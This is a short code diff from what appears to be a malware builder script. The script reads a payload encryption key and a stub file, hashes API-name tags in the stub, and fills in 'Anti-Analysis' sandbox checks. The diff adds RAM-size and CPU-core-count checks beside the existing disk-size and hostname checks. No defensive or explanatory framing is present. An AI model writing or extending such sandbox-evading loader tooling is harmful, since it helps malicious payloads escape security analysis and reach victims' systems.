@@ -21,6 +21,9 @@ ENCRYPTION_KEY = config.get("Payload", "encryption_key")
 STUB_FILE = config.get("Stub", "filename")
 
 DISK_SIZE = config.get("Anti-Analysis", "disk_size")
+RAM_SIZE = config.get("Anti-Analysis", "ram_size")
+CPU_COUNT = config.get("Anti-Analysis", "cpu_cores")
+
 TARGET_HOSTNAME = config.get("Anti-Analysis", "target_hostname")
 
 AVOID_HOSTNAME = config.get("Anti-Analysis", "avoid_hostname").split(",")
@@ -69,6 +72,7 @@ def main():
     for file in all_tags:
         filename = file["filename"]
         tags = file["tags"]
+        print(f"Processing {filename} with tags {tags}")
         # Tags like %HASH__MODULE__FUNCTION% are replaced by their hash
         for tag in tags:
             parts = tag.replace("%", "").split("__")
@@ -79,6 +83,11 @@ def main():
             if parts[0] == "SANDBOX":
                 if parts[1] == "DISKSIZE":
                     sed_file(WORKING_FOLDER+filename, tag, DISK_SIZE)
+                if parts[1] == "CPU_COUNT":
+                    print("CPU_COUNT: ", CPU_COUNT)
+                    sed_file(WORKING_FOLDER+filename, tag, CPU_COUNT)
+                if parts[1] == "RAM_SIZE":
+                    sed_file(WORKING_FOLDER+filename, tag, RAM_SIZE)
                 if parts[1] == "TARGET_HOSTNAME":
                     if len(TARGET_HOSTNAME):
                         sed_file(WORKING_FOLDER+filename, tag, hash_obj("",TARGET_HOSTNAME))
